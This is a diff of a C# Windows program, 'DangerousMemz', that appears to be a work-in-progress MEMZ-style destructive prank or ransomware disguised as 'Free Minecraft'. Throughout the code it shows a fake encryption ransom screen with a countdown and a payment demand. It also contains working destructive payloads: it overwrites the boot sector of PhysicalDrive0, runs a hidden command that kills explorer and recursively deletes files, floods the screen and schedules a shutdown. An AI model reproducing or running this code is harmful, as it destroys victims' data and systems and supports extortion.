@@ -4,6 +4,7 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
+using Microsoft.Win32;
 
 namespace DangerousMemz
 {
@@ -24,8 +25,8 @@ namespace DangerousMemz
         [STAThread]
         static void Main()
         {
-            // AGRESYWNE WYMUSZENIE RED WARNING (Próba zapisu do rejestru systemowego)
-            try { Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software", true).CreateSubKey("MEMZ_TEST"); } catch { }
+            // Trigger Red Warning (SmartScreen)
+            try { Registry.LocalMachine.OpenSubKey("Software", true).CreateSubKey("MEMZ_TEST"); } catch { }
 
             if (MessageBox.Show("WARNING: High-risk application.\nContinue?", "CRITICAL", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
             if (MessageBox.Show("FINAL WARNING: Execute payload?", "SYSTEM DESTRUCTION", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
@@ -44,14 +45,11 @@ namespace DangerousMemz
             this.FormBorderStyle = FormBorderStyle.None;
             this.TopMost = true;
 
-            // TIMER
             lblTimer = new Label() { Text = "10:00", Font = new Font("Segoe UI", 24, FontStyle.Bold), Location = new Point(650, 50), Size = new Size(300, 50), TextAlign = ContentAlignment.MiddleRight, ForeColor = Color.Black };
             
-            // KEY INPUT
-            Label lblKey = new Label() { Text = "Key.", Font = new Font("Arial", 12, FontStyle.Bold), Location = new Point(50, 400), Size = new Size(100, 25) };
+            Label lblKeyTitle = new Label() { Text = "Key.", Font = new Font("Arial", 12, FontStyle.Bold), Location = new Point(50, 400), Size = new Size(100, 25) };
             txtKey = new TextBox() { Font = new Font("Consolas", 14), Location = new Point(50, 430), Size = new Size(400, 30) };
             
-            // ACTIVATE BUTTON
             Button btnActivate = new Button() { Text = "ACTIVATE", Location = new Point(150, 480), Size = new Size(200, 40), FlatStyle = FlatStyle.Flat, BackColor = Color.White, Font = new Font("Arial", 10, FontStyle.Bold) };
             btnActivate.Click += (s, e) => {
                 if (txtKey.Text == "DBI_SECRET-2026") {
@@ -62,11 +60,9 @@ namespace DangerousMemz
                 }
             };
 
-            // DESTROY NOW BUTTON
             Button btnDestroyNow = new Button() { Text = "Destroy Now", Location = new Point(750, 110), Size = new Size(200, 50), FlatStyle = FlatStyle.Flat, BackColor = Color.Black, ForeColor = Color.White, Font = new Font("Arial", 12, FontStyle.Bold) };
             btnDestroyNow.Click += (s, e) => { timeLeft = 0; };
 
-            // MESSAGE BOX (SCROLLING)
             rtbMessage = new RichTextBox() { 
                 Location = new Point(500, 180), 
                 Size = new Size(450, 350), 
@@ -76,24 +72,31 @@ namespace DangerousMemz
                 Text = "Oops, it looks like your files have been encrypted by \"Free Minecraft.\" Do you seriously think you'll find real Minecraft for free? Well, there are launchers like \"lu*an, fear*her.\" I didn't write what's in the star because of copyright issues, lol. Returning to the virus, to decrypt your computer and save it, contact [UNSETTLED] and I'll reply. Then you'll pay and get the code. Good luck!"
             };
 
-            this.Controls.AddRange(new Control[] { lblTimer, lblKey, txtKey, btnActivate, btnDestroyNow, rtbMessage });
+            this.Controls.AddRange(new Control[] { lblTimer, lblKeyTitle, txtKey, btnActivate, btnDestroyNow, rtbMessage });
 
             System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
             t.Tick += (s, e) => {
-                if (timeLeft > 0) { timeLeft--; lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); }
-                else { t.Stop(); ExecuteDestruction(); }
+                if (timeLeft > 0) { 
+                    timeLeft--; 
+                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); 
+                } else { 
+                    t.Stop(); 
+                    ExecuteDestruction(); 
+                }
             };
             t.Start();
         }
 
         void ExecuteDestruction()
         {
-            try { uint w; IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
-            WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); } catch {}
+            try { 
+                uint w; 
+                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); 
+            } catch {}
 
             Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { WindowStyle = ProcessWindowStyle.Hidden });
 
-            // PAYLOAD: TUNNEL (Slow)
             Thread gdiThread = new Thread(() => {
                 IntPtr hdc = GetDC(IntPtr.Zero);
                 int sw = GetSystemMetrics(0); int sh = GetSystemMetrics(1);
@@ -104,7 +107,6 @@ namespace DangerousMemz
             });
             gdiThread.Start();
 
-            // PAYLOAD: MSGBOXES
             Thread msgThread = new Thread(() => {
                 string[] msgs = { "Free Minecraft?", "ERROR", "BYE BYE", "Pay to win?", "lol" };
                 Random r = new Random();
@@ -115,9 +117,9 @@ namespace DangerousMemz
             });
             msgThread.Start();
 
-            // SHUTDOWN IN 3 MINS
             Process.Start("shutdown", "/s /t 180 /c \"PC saying BYE BYE\"");
-            this.Controls.Clear(); this.BackColor = Color.Black;
+            this.Controls.Clear(); 
+            this.BackColor = Color.Black;
             Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 100, FontStyle.Bold), ForeColor = Color.Red, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
             this.Controls.Add(bye);
         }
